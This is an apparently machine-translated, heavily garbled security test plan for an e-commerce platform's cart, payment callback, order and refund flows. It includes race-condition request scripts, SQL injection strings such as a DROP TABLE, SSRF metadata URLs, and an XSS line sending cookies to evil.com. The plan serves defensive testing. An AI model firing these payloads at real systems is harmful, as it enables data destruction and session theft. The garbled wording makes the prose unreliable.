# electronic commercePlatformPaymentandOrderflow processSecureTest Plan

## 1. Test ScopeandTarget

### 1.1 Test Scope

| model block | sub function can | Risk Level |
|------|--------|---------|
| Shopping Cart | Addcommerce product/Modifynumber quantity/price formatCompute/InventoryValidate | in |
| Online Payment | AlipayPayment/WeChatPayment/PaymentCallback/PaymentStatussame step | Critical |
| Order Management | OrderCreate/Statusflow transfer/Ordercheck query/Order Tampering | High |
| Refund Flow | Refund please/Refundaudit audit/Refundtoaccount/Duplicate Refund | Critical |

### 1.2 Test Objective

- ValidatePaymentAmountnotCanbeClienttamper change
- ValidateOrder State Machineflow transferofCompletenessandnotCan ness
- ValidateRefundlogic logic not existinDuplicate Refund/super amountRefundvulnerability
- ValidatePaymentCallbackofSignatureValidateandIdempotencyness
- Validatebusiness logic logicinofRace Condition(Race Condition)defense protect
- ValidateAuthorization Bypasscontrol make(Horizontal Authorization Bypass + Vertical Authorization Bypass)

---

## 2. Shopping CartSecuretest

### 2.1 price format tamper change test

**Test ID**: CART-001
**Risk Level**: Critical
**Test Objective**: ValidateServerwhetherasDatabaseprice formatasaccurate, whileNon-information anyClientpass inject price format

**Test Steps**:
1. correct commonAddcommerce producttoShopping Cart, useuse Burp Suite InterceptRequest
2. ModifyRequestinof `price` Field(such as 100.00 changeas 0.01)
3. SubmitOrder, Observereal actual result algorithmAmount
4. Checkwhether existshidden hiddenof `unit_price`/`total_price`/`amount` etc.Cantamper changeField
5. inresult algorithm page againtimesInterceptRequest, Modifymost finalSubmitofAmountField

**Expected Result**: ServershouldignoreClientpass injectofprice format, initial finalfromDatabaseReadcommerce product when first price format

**ValidateMethod**:
- for ratioOrdertableinRecordofAmountandcommerce product tableinofreal actual price format
- CheckPaymentRequestSendtoAlipay/WeChatofAmountwhetherandOrderAmountone cause

---

### 2.2 number quantity out test

**Test ID**: CART-002
**Risk Level**: High
**Test Objective**: Validatecommerce product number quantityofboundary boundary value handle manage

**Test Steps**:
1. willcommerce product number quantityModifyasNegative Number(such as `-1`), Observewhetherasset generate negativeAmountOrder
2. willnumber quantityModifyas `0`, Observewhetherallow allowCreatezeroAmountOrder
3. willnumber quantityModifyassuper large integer number(such as `2147483647`/`99999999`), Observewhetherinteger number out
4. willnumber quantityModifyassmall number(such as `0.001`), ObserveServerhandle manage
5. willnumber quantityModifyasspecial value(such as `NaN`/`Infinity`/`null`)

**Expected Result**: ServershouldValidatenumber quantityascorrect integer number, and not super throughInventoryabove limitandbusiness above limit

---

### 2.3 InventoryRace Conditiontest

**Test ID**: CART-003
**Risk Level**: High
**Test Objective**: ValidateConcurrencyunder single timeofInventorydeduct reducewhether existssuper

**Test Steps**:
1. select oneInventoryas 1 ofcommerce product
2. useuseScriptConcurrencySend 50 under singleRequest(Samecommerce product, number quantity 1)
3. Checkmost finalSuccessCreateofOrdernumber quantity
4. CheckInventorywhetherchangeasNegative Number

**ConcurrencyScriptExample**:
```python
import asyncio
import aiohttp

async def place_order(session, url, headers, payload):
 async with session.post(url, json=payload, headers=headers) as resp:
 return await resp.json()

async def main():
 url = "https://target.com/api/order/create"
 headers = {"Authorization": "Bearer <token>", "Content-Type": "application/json"}
 payload = {"product_id": "SKU001", "quantity": 1}

 async with aiohttp.ClientSession() as session:
 tasks = [place_order(session, url, headers, payload) for _ in range(50)]
 results = await asyncio.gather(*tasks)
 success = [r for r in results if r.get("code") == 200]
 print(f"SuccessOrdernumber: {len(success)}")

asyncio.run(main())
```

**Expected Result**: only 1 OrderSuccess, other shouldReturnInventoryInsufficient

---

### 2.4 Coupon/discount deduct logic logic test

**Test ID**: CART-004
**Risk Level**: High
**Test Objective**: ValidateCouponuseuseofSecureness

**Test Steps**:
1. useuseoneitemsCouponunder single, InterceptRequestObtainCouponID
2. CancelOrderafter, againtimesuseuseSameCouponIDunder single(testCouponwhethercorrect confirm return anddefense serioususe)
3. ModifyCouponpage amountField(such as `discount_amount` from 10 changeas 1000)
4. SameOrder add useusemanyitemssame typeCoupon(ModifyRequestinof `coupon_ids` number array)
5. useuseotherUserofCouponID(Horizontal Authorization Bypass)
6. willpriority Amountsetasgreater thancommerce product total priceofvalue, Checkwhetherasset generateNegative NumbershouldpayAmount
7. ConcurrencyuseuseSameitemsCouponCreatemanyOrder

**Expected Result**:
- Couponpage amount byServerCompute, not information anyClient
- SameCouponnotCanserious repeat useuse
- notCanuseuseother personCoupon
- shouldpayAmountshould notasNegative Number

---

## 3. Paymentflow processSecuretest

### 3.1 Payment Amount Tamperingtest

**Test ID**: PAY-001
**Risk Level**: Critical
**Test Objective**: ValidatefromOrderCreatetoPaymentRequestall link routeofAmountone cause ness

**Test Steps**:
1. Create Order(false setAmount 500 yuan), advance injectPaymentpage
2. InterceptFrontendtowardBackendSendof"CreatePaymentsingle"Request
3. ModifyRequestinof `total_amount` / `total_fee` Fieldas `0.01`
4. ObserveBackendReturnofAlipay/WeChatexpectedPaymentParameterinofAmount
5. such asifBackendReturndonePaymentlink connect/two maintain code, decode Among themofAmountParameter
6. Directstructure forge forAlipay/WeChatPaymentInterfaceofRequest, ReplaceAmountParameter

**Expected Result**: BackendinCreatePaymentsingle time, shouldfromOrdertableinReadAmount, ignoreClientpass inject value

**deep degreeValidate**:
- CheckCodein `alipay.trade.create` / `wxpay.unifiedorder` of `total_amount` come source
- Confirmis `order.total_amount` whileNon- `request.body.amount`

---

### 3.2 Payment Callback Forgerytest

**Test ID**: PAY-002
**Risk Level**: Critical
**Test Objective**: ValidatePaymentSuccessCallback(notify_url)ofSecureness

**Test Steps**:

#### 3.2.1 SignatureValidatetest
1. Obtainone real realofAlipay/WeChatCallbackRequest version(Passcorrect commonPaymentflow process packet capture)
2. ModifyCallbackinof `trade_status` as `TRADE_SUCCESS`, but not serious newSignature
3. Direct POST toSystemof `notify_url` Endpoint
4. ObserveOrderStatuswhetherbeModifyasPaid

#### 3.2.2 CallbackReplaytest
1. one combine methodofPaymentSuccessCallbackRequest(includeValidSignature)
2. principle not dynamicReplaythisRequest 10 times
3. Checkwhethertrigger initiate done serious repeatofbusiness handle manage(such asserious repeat shipping/serious repeat add part)

#### 3.2.3 CallbackParametertamper change test
1. structure forgeCallbackRequest, will `out_trade_no`(commerce accountOrdernumber)Replaceas one notPaymentOrderofID
2. protect hold `trade_no`(PaymentPlatformtransaction easy number)asPaidOrderoftransaction easy number
3. ObserveSystemwhetherwillnotPaymentOrderidentifier recordasPaid

#### 3.2.4 come sourceIPValidatetest
1. fromNon-Alipay/WeChat methodIPSendCallbackRequest
2. CheckSystemwhetherValidatedoneCallbackcome sourceIP

**Expected Result**:
- mustValidateSignature, noSignatureorSignatureerrorofCallbackDirectreject reject
- mustreal currentIdempotencyhandle manage, serious repeatCallbacknot serious repeatExecutebusiness logic logic
- mustValidate `out_trade_no` and `trade_no` offorshouldkey system
- create protocolValidatecome sourceIPWhitelist

---

### 3.3 PaymentStatusrotate query tamper change test

**Test ID**: PAY-003
**Risk Level**: High
**Test Objective**: ValidateFrontendrotate queryPaymentStatusofSecureness

**Test Steps**:
1. Create Orderbut not real actualPayment
2. InterceptFrontendrotate queryPaymentStatusofRequest(such as `GET /api/order/payment-status?order_id=xxx`)
3. ModifyResponseinof `status` from `pending` as `paid`
4. ObserveFrontendwhetherDirectskip transferto"PaymentSuccess"page and trigger initiate after continue flow process
5. CheckBackendwhether hasindependent standaloneofPaymentStatusConfirmmachine make(such asprimary dynamic check queryAlipay/WeChatOrderStatus)

**Expected Result**: Frontend showCanbe tamper change, butBackendmustPassCallbackorprimary dynamic check queryConfirmPaymentStatus, not depend relyFrontendabove report

---

### 3.4 Paymentsuper timeandOrderkey close test

**Test ID**: PAY-004
**Risk Level**: in
**Test Objective**: ValidatePaymentsuper time afterOrderkey closeofSecureness

**Test Steps**:
1. Create Order, ObtainPaymentlink connect/two maintain code
2. etc.pendingOrdersuper time key close(ormobile dynamic trigger initiate key close)
3. useuseof firstObtainofPaymentlink connect/two maintain codeAttemptcompletePayment
4. such asifAlipay/WeChatPaymentSuccess, CheckSystemwhethercan correct confirm handle manage this type"already key closeOrdercollecttoPaymentSuccessCallback"ofdetails
5. check whether there isself dynamicRefundmachine make handle manage type abnormal common

**Expected Result**:
- Orderkey close aftershouldCallPaymentPlatformofkey singleInterface
- such asif key single after still collecttoPaymentSuccessCallback, shouldself dynamic initiate initiateRefund
- should notout current"Userpay done butOrderalready key close"ofresource funds Status

---

### 3.5 Paymentmethod mode switch change test

**Test ID**: PAY-005
**Risk Level**: in
**Test Objective**: Validateswitch changePaymentmethod mode timeofSecureness

**Test Steps**:
1. select AlipayPayment, ObtainPaymentParameter
2. not completePayment, switch changeasWeChatPayment
3. Checkwhether isSameOrdergenerate complete done manyPaymentsingle
4. useAlipayofoldPaymentParametercompletePayment
5. againuseWeChatofPaymentParameter completePayment
6. Checkwhetherout current oneOrderbePaymenttwotimesofdetails

**Expected Result**: switch changePaymentmethod mode timeshouldkey close/operation of firstofPaymentsingle, confirm protect oneOrdercan onlybePaymentonetimes

---

### 3.6 Signatureandadd secret test

**Test ID**: PAY-006
**Risk Level**: Critical
**Test Objective**: ValidateandPaymentPlatformwild informationofSignaturemachine makeSecureness

**Test Steps**:
1. CheckAlipaycollect completewhetheruseuse RSA2(SHA256WithRSA)whileNon- RSA(SHA1WithRSA)
2. CheckWeChatPaymentwhetheruseuse V3 Signature(AEAD_AES_256_GCM)whileNon-already of MD5 Signature
3. Checkprivate /cert certificatewhetherhardEncodinginSource Codein
4. Checkprivate FilePermissionwhether is 600
5. Checkwhether existsSignatureBypassoflogic logic(such as `if sign == "" { skip_verify }` this typeCode)
6. CheckLoginwhetherbreak done sensitive sensitiveofSignatureKeyorPaymentParameter

**Expected Result**:
- useusemost newofSignaturealgorithm method
- Keynotinsource codeinhardEncoding, Passenvironment environment change quantityorKeymanage manage service add
- SignatureValidatenoBypassPath

---

## 4. Order ManagementSecuretest

### 4.1 OrderAuthorization Bypasstest

**Test ID**: ORDER-001
**Risk Level**: High
**Test Objective**: ValidateUsercannotaccess askoroperation other personOrder

**Test Steps**:

#### 4.1.1 Horizontal Authorization Bypass - View
1. User A Login, Obtainself ownofOrderID(such as `order_id=10001`)
2. ModifyRequestinof `order_id` asUser B ofOrder(such as `order_id=10002`)
3. Send `GET /api/order/detail?order_id=10002`
4. ObservewhetherReturndoneUser B ofOrderdetailed details

#### 4.1.2 Horizontal Authorization Bypass - operation
1. User A AttemptCancelUser B ofOrder:`POST /api/order/cancel {"order_id": "10002"}`
2. User A AttemptforUser B ofOrderinitiate initiateRefund
3. User A AttemptModifyUser B Orderofcollect goodsAddress

#### 4.1.3 Vertical Authorization Bypass
1. Regular UserAttemptCallAdministratorInterface(such as `POST /api/admin/order/update-status`)
2. Regular UserAttemptwillOrderStatusDirectModifyas"already shipping"
3. Checkmanage manage backend consoleofOrder ManagementInterfacewhether hasindependent standaloneofPermissionValidate

**Expected Result**: AllOrderoperationmustValidatewhen firstUserwhether isOrderAllperson, manage manageInterfacemustValidateAdministratorRole

---

### 4.2 OrdernumberPredictableness test

**Test ID**: ORDER-002
**Risk Level**: in
**Test Objective**: ValidateOrdernumberwhetherCanbeEnumerationorprediction

**Test Steps**:
1. continuous continueCreate 10 Order, RecordOrdernumber
2. AnalyzeOrdernumberofgenerate complete scale rule(whether isself increase/timestamp/UUID etc.)
3. such asifasself increase ID, AttemptTraversalOrdernumberObtainotherUserofOrderinformation
4. such asif include include timestamp, Attemptprediction under oneOrdernumber

**Expected Result**: Ordernumbershouldinclude include machine complete part, notCanbe easyEnumerationorprediction;that is use be to, shouldhasPermissionValidate

---

### 4.3 Order State MachineCompleteness test

**Test ID**: ORDER-003
**Risk Level**: High
**Test Objective**: ValidateOrderStatusflow transfer notCanbeNon-method skip transfer

**correct commonStatusflow transfer**:
```
Pending Payment -> Paid -> pending shipping -> already shipping -> already collect -> Completed
 down
 Refundin -> Refunded
Pending Payment -> alreadyCancel
```

**Test Steps**:
1. Attemptwill"Pending Payment"OrderDirectModifyas"already shipping"Status
2. Attemptwill"Completed"Orderreturn refundas"Pending Payment"Status
3. Attemptwill"alreadyCancel"Orderserious new as"Pending Payment"
4. Attemptwill"Refunded"OrderModifyas"Completed"
5. InterceptStatusUpdateRequest, Modify `status` FieldasNon-method value(such as `-1`/`999`/`paid`)
6. Checkwhether existsDirectexpose exposureofStatusUpdate API(such as `POST /api/order/update {"status": "shipped"}`)

**Expected Result**:
- Serverreal current severe formatofStatusmachine, only allow allow combine methodofStatustransfer change
- StatusUpdatePassbusiness operation trigger initiate(such as"shipping"operation), whileNon-DirectModifyStatusField
- Non-methodStatustransfer changeReturnclear confirm error

---

### 4.4 OrderInformation Disclosuretest

**Test ID**: ORDER-004
**Risk Level**: in
**Test Objective**: ValidateOrderAPInot DisclosureSensitive Information

**Test Steps**:
1. ViewOrderdetailed details API ofResponse, Checkwhetherinclude includethe followingSensitive Information:
 - CompleteofPaymenttransaction easy number
 - PaymentCallbackofprinciple initialData
 - internal partUserIDorDatabaseprimary key
 - otherUserofcollect goodsAddress/mobile number(not leak sensitive)
 - BackendServerinternal part information(IP/Databasecontinuous connect stringetc.)
2. CheckOrderlistAPIwhetherCanPassParameterinject injectObtainamount externalField(such as `?fields=*` or `?include=payment_detail`)
3. CheckerrorResponseinwhetherinclude include stack stack informationorSQL

**Expected Result**: API onlyReturnFrontend show needField, Sensitive Informationleak sensitive handle manage, error information notDisclosureinternal part real current

---

## 5. Refund FlowSecuretest

### 5.1 Duplicate Refundtest

**Test ID**: REFUND-001
**Risk Level**: Critical
**Test Objective**: ValidateSameOrdernotCanbe manytimesRefund

**Test Steps**:
1. for one entryPaidOrderinitiate initiateRefund please
2. inRefundhandle managein, ConcurrencySend 20 RefundRequest(related sameOrdernumber)
3. Checkreal actualRefundtimesnumberandRefundtotalAmount
4. RefundSuccessafter, againtimesAttemptforSameOrderinitiate initiateRefund
5. CheckRefundRecordtable, whether existsserious repeatRecord

**ConcurrencyRefundtestScript**:
```python
import asyncio
import aiohttp

async def refund(session, url, headers, payload):
 async with session.post(url, json=payload, headers=headers) as resp:
 return await resp.json()

async def main():
 url = "https://target.com/api/refund/create"
 headers = {"Authorization": "Bearer <token>", "Content-Type": "application/json"}
 payload = {"order_id": "ORDER_20260306_001", "reason": "not need done"}

 async with aiohttp.ClientSession() as session:
 tasks = [refund(session, url, headers, payload) for _ in range(20)]
 results = await asyncio.gather(*tasks)
 success = [r for r in results if r.get("code") == 200]
 print(f"SuccessRefundtimesnumber: {len(success)}")

asyncio.run(main())
```

**Expected Result**: no commentConcurrencymany lesstimes, SameOrderonlyRefundonetimes, useuseDistributed LockorDatabaseunique constraint protect cert

---

### 5.2 super amountRefundtest

**Test ID**: REFUND-002
**Risk Level**: Critical
**Test Objective**: ValidateRefundAmountnotCansuper through real actualPaymentAmount

**Test Steps**:
1. for one entry 100 yuanofOrderinitiate initiateRefund, InterceptRequest
2. will `refund_amount` Modifyas `200`(super throughOrderAmount)
3. will `refund_amount` Modifyas `-50`(Negative NumberRefund)
4. will `refund_amount` Modifyas `0.001`(precision degree attack attack)
5. for part partRefundofOrder(already refund 60 yuan), againtimesRefund 60 yuan(total plan super through 100 yuan)
6. CheckRefundAmountComputewhether exists point precision degree ask problem(such as `0.1 + 0.2!= 0.3`)

**Expected Result**:
- RefundAmountbyServerValidate, not information anyClientpass inject value
- planRefundAmountnot super through real actualPaymentAmount
- useuseinteger number(part)or Decimal advancelinesAmountCompute, avoid point precision degree ask problem

---

### 5.3 Refundtoaccount tamper change test

**Test ID**: REFUND-003
**Risk Level**: Critical
**Test Objective**: ValidateRefundcan onlyrefundtoprinciplePaymentAccount

**Test Steps**:
1. initiate initiateRefundRequest, Checkwhether exists `refund_account` / `refund_to` etc.Field
2. such asif existin, AttemptModifyasotherAlipay/WeChatAccount
3. CheckRefundInterfacewhetherallow allow specified setRefundmethod mode(such asprinciple routeRefundbe changeasrefundtoBalance)
4. CheckRefundRecordinofcollect payment methodwhetherandprinciplePaymentmethod one cause

**Expected Result**: Refundmustprinciple routeReturn, not allow allowClientspecified setRefundTargetAccount

---

### 5.4 RefundStatustamper change test

**Test ID**: REFUND-004
**Risk Level**: High
**Test Objective**: ValidateRefundStatusnotCanbeNon-methodModify

**Test Steps**:
1. initiate initiateRefund please(Status:pending audit audit)
2. AttemptDirect CallInterfaceskip through audit audit, willStatusModifyas"Refunded"
3. Administratorreject rejectRefundafter, Attemptserious newwillStatuschangeas"pending audit audit"or"Refunded"
4. CheckRefundCallback(Alipay/WeChatRefundResultwild notify)whether hasSignatureValidate
5. forgeryRefundSuccessofCallbackwild notify

**Expected Result**: RefundStatusflow transfer byBackendcontrol make, Callbackwild notifymustValidateSignature

---

### 5.5 part partRefundlogic logic test

**Test ID**: REFUND-005
**Risk Level**: High
**Test Objective**: Validatepart partRefundscenario scene underofAmountComputeSecureness

**Test Steps**:
1. Orderinclude include 3 item commerce product(A: 30yuan, B: 50yuan, C: 20yuan), total plan 100 yuan, useusedone 10 yuanCoupon, real pay 90 yuan
2. for commerce product A initiate initiateRefund, CheckRefundAmountwhethercorrect confirm part doneCoupondiscount deduct
3. one by one for A/B/C part levelRefund, Check planRefundtotal amountwhetheretc.for real payAmount(90 yuan)
4. inpart Computein, Checkwhether existsbecause four injectCausingof"over-refund"or"under-refund"
5. ModifyRefundRequestinofcommerce product number quantity(such asonly buy done 1 item please refund 2 item)

**Expected Result**:
- priority Amountby ratiocasespart toeach item commerce product
- planRefundnot super through real payAmount
- most after one item commerce productRefundtime useuse"total amount - already refundAmount"Compute, avoid precision degree cumulative error error

---

## 6. wilduseSecuretest

### 6.1 InterfaceAuthenticationandAuthorizationtest

**Test ID**: GEN-001
**Risk Level**: High

**Test Steps**:
1. not with Token / Cookie Direct Callthe followingInterface, CheckwhetherReturn 401:
 - `POST /api/order/create`
 - `POST /api/payment/create`
 - `POST /api/refund/create`
 - `GET /api/order/list`
2. useuseexpired Token Callabove descriptionInterface
3. useuseno valid/forgery Token Callabove descriptionInterface
4. Check Token whether existsInformation Disclosure(JWT decode codeView payload content)
5. such asif useuse JWT, test algorithm method mix attack attack(`alg: none`/RS256->HS256)

---

### 6.2 Requestrate rate limit make test

**Test ID**: GEN-002
**Risk Level**: in

**Test Steps**:
1. forCreate OrderInterfaceadvancelinesHighfrequencyCall(each 100 times), check whether there isRate Limiting
2. forPaymentInterfaceadvancelinesHighfrequencyCall, Checkwhethertrigger risk control
3. forRefundInterfaceadvancelinesHighfrequencyCall
4. CheckRate Limitingpolicy strategy is based on IP/UserID is two person result combine
5. testBypassRate Limiting:update change IP/update change User-Agent/Add `X-Forwarded-For` Header

---

### 6.3 Parameterinject inject test

**Test ID**: GEN-003
**Risk Level**: High

**Test Steps**:
1. inOrderrelated keyInterfaceofParameterininject inject SQL:
 - `order_id=10001' OR 1=1--`
 - `order_id=10001; DROP TABLE orders;--`
2. insearch/check queryInterfaceinject inject NoSQL(such as MongoDB):
 - `{"order_id": {"$gt": ""}}`
 - `{"status": {"$ne": null}}`
3. ininvolvingCallback URL ofParameterintest SSRF:
 - `notify_url=http://169.254.169.254/latest/meta-data/`
 - `return_url=http://internal-server:8080/admin`
4. incommerce product name name/collect goodsAddress/Refundprinciple becauseetc.textFieldininject inject XSS:
 - `<script>document.location='http://evil.com/steal?c='+document.cookie</script>`
 - `"><img src=x onerror=alert(1)>`

---

### 6.4 business logic logicBypasstest

**Test ID**: GEN-004
**Risk Level**: High

**Test Steps**:

#### 6.4.1 flow process skip through
1. without going throughShopping Cart, Direct CallCreate OrderInterface
2. without going throughOrderCreate, Direct CallPaymentInterface
3. skip throughAddressfill inStep, DirectSubmitOrder

#### 6.4.2 Parameter Pollution
1. SameRequestinpass inject many `order_id` Parameter:`order_id=10001&order_id=10002`
2. JSON inpass inject serious repeat key:`{"amount": 100, "amount": 0.01}`
3. in POST body and URL query insame time pass inject `order_id`, ObserveServertake which value

#### 6.4.3 time sequence attack attack
1. inCoupontoperiod first one instant initiate initiate under singleRequest(boundary boundary time between test)
2. inlimited-time sale endsofinstantConcurrencyunder single
3. CheckServeroftime betweenValidatewhether existstime ask problem

---

### 6.5 sensitive sensitiveDataprotect protect test

**Test ID**: GEN-005
**Risk Level**: High

**Test Steps**:
1. CheckPaymentpagewhetherstrong make useuse HTTPS
2. CheckPaymentrelated key Cookie whetherset set done `Secure`/`HttpOnly`/`SameSite` attributes
3. CheckPaymentrelated keyInterfaceofResponseHeader:
 - `Strict-Transport-Security` (HSTS)
 - `Content-Security-Policy` (CSP)
 - `X-Content-Type-Options: nosniff`
4. CheckPaymentLoginwhetherRecorddoneCompletebanklinescard number/CVV/PaymentPasswordetc.Sensitive Information
5. CheckDatabaseinPaymentinformationofStoragemethod mode(whetheradd secret)

---

## 7. Alipay/WeChatspecial setSecuretest

### 7.1 Alipaycollect completeSecureCheck

**Test ID**: ALIPAY-001
**Risk Level**: High

**Check Item**:

| Checkpoint | Secureneed require | Check Method |
|--------|---------|---------|
| Signaturealgorithm method | RSA2 (SHA256WithRSA) | ViewCodein `sign_type` Configuration |
| cert certificate mode | create protocol useusecert certificate mode whileNon-company mode | Checkwhetheruseuse `alipay_cert_path` |
| notify_url | HTTPS + Domain NamenotCanbeUsercontrol make | CheckwhetherhardEncodingorfromConfigurationRead |
| return_url | onlyuseforFrontendskip transfer, does not make business decisions | Check return Callbackwhethertrigger initiate shippingetc.operation |
| app_id | andreal actual commerce account number one cause | for ratioConfigurationandAlipaybackend console |
| primary dynamic check query | collecttoCallbackaftershouldprimary dynamicCall `alipay.trade.query` twotimesConfirm | CheckCallbackhandle manageCode |
| key single | Ordersuper timeshouldCall `alipay.trade.close` | Checksuper time handle manage logic logic |

---

### 7.2 WeChatPaymentcollect completeSecureCheck

**Test ID**: WXPAY-001
**Risk Level**: High

**Check Item**:

| Checkpoint | Secureneed require | Check Method |
|--------|---------|---------|
| API version version | useuse V3 Interface | CheckRequest URL whether is `/v3/` prefix |
| Signaturemethod mode | AEAD_AES_256_GCM + SHA256-RSA2048 | CheckSignatureCode |
| cert certificate manage manage | useusePlatformcert certificate self dynamicUpdatemachine make | Checkwhetherset period rotate change cert certificate |
| mch_id | commerce account number notCanbe tamper change | CheckwhetherhardEncodinginServer |
| Callbackdecrypt | useuse APIv3 Keydecrypt wild notify body | Check `resource.ciphertext` ofdecrypt logic logic |
| JSAPI Parameter | `prepay_id` etc.ParameterbyBackendgenerate andSignature | CheckFrontendObtainPaymentParameterofflow process |

---

## 8. testToolclear single

| Tool | Purpose |
|------|------|
| Burp Suite Professional | HTTP(S) Request Interception/Modify/Replay |
| Postman / cURL | Interfacedebuggingandmobile dynamic test |
| Python + aiohttp | ConcurrencyRequestScript(Race Conditiontest) |
| sqlmap | SQL inject inject self dynamic ize check test |
| OWASP ZAP | self dynamic ize vulnerabilityScan |
| Wireshark / tcpdump | Networklayer packet captureAnalyze |
| JWT.io / jwt_tool | JWT Token Analyzeandforgery |
| IDE + Codeaudit plan | Source Codelevel levelofSecureaudit plan |

---

## 9. testPrioritymatrix matrix

byRisk Levelandexploituse degree rank sequence, create protocol test order sequence:

| Priority | Test ID | Test Item | risk | Reason |
|--------|---------|--------|------|------|
| P0 | PAY-002 | Payment Callback Forgery | Critical | DirectCausing0yuanbuy, self dynamic ize exploituse |
| P0 | PAY-001 | Payment Amount Tampering | Critical | Directfinancial loss |
| P0 | REFUND-001 | Duplicate Refund | Critical | Directresource funds loss loss, Canself dynamic ize exploituse |
| P0 | REFUND-002 | super amountRefund | Critical | Directresource funds loss loss |
| P1 | CART-001 | price format tamper change | Critical | 0yuanbuyorLowprice buy |
| P1 | PAY-006 | SignatureSecure | Critical | root base nessSecureask problem |
| P1 | REFUND-003 | Refundtoaccount tamper change | Critical | resource funds flow toward abnormal common |
| P1 | ORDER-001 | Authorization Bypass | High | hidden privateDisclosure + business operation |
| P2 | CART-003 | InventoryRace | High | super financial loss |
| P2 | ORDER-003 | StatusmachineCompleteness | High | business logic logic abnormal common |
| P2 | CART-004 | Couponlogic logic | High | financial loss |
| P2 | GEN-003 | Parameterinject inject | High | DataDisclosure/Systeminject |
| P3 | CART-002 | number quantity out | High | Computeabnormal common |
| P3 | PAY-003 | Statusrotate query tamper change | High | Frontend |
| P3 | PAY-004 | Paymentsuper time | in | resource funds |
| P3 | PAY-005 | Paymentmethod mode switch change | in | serious repeatPayment |
| P4 | GEN-001 | AuthenticationAuthorization | High | base foundationSecure |
| P4 | GEN-002 | rate rate limit make | in | defense abuseuse |
| P4 | GEN-005 | sensitive sensitiveDataprotect protect | High | combine scale need require |

---

## 10. Test Report Template

EachTest Pointcomplete after, bythe followingformat modeRecordResult:

```
### [Test ID] Test Itemname name

- **Test Time**: YYYY-MM-DD HH:MM
- **tester**:
- **Test Result**: Pass / Failure / existinrisk
- **Risk Level**: Low / in / High / Critical
- **Reproduction Steps**: (such asFailure, DetailedRecordrepeat currentMethod)
- **Request version**: (keyof HTTP Request/Responseintercept imageortext)
- **Impact Scope**: (affected impact responseofUser bodyandbusiness scenario scene)
- **Remediation Recommendation**: (Concreteoftechnique fix repeat method plan)
- **ValidateStatus**: pending remediation / already fix repeat pendingValidate / alreadyValidate
```

---

## ten1. common vulnerabilitiesRemediation Recommendationrate check

| Vulnerability Type | fix repeat method plan |
|----------|---------|
| Amount Tampering | ServerfromDatabaseReadAmount, ignoreClientpass value;CreatePaymentsingle time againtimesValidate |
| Callbackforgery | ValidateSignature + Validatecome sourceIP + primary dynamic check queryPaymentPlatformConfirm |
| Duplicate Refund | Databaseunique constraint + Distributed Lock + Idempotencykey |
| super amountRefund | planRefundAmountValidate + useuseinteger number(part)Compute |
| Race Condition | Databaseoptimistic lock(version version number)orpessimistic lock(SELECT FOR UPDATE)+ Redis Distributed Lock |
| Authorization Bypass | Allcheck query add `WHERE user_id =:current_user_id` condition |
| State-Machine Bypass | Serverreal currentStatusmachine, not expose exposure wilduseStatusUpdateInterface |
| OrdernumberEnumeration | useuse UUID/ flower algorithm method + PermissionValidatedual serious protect protect |
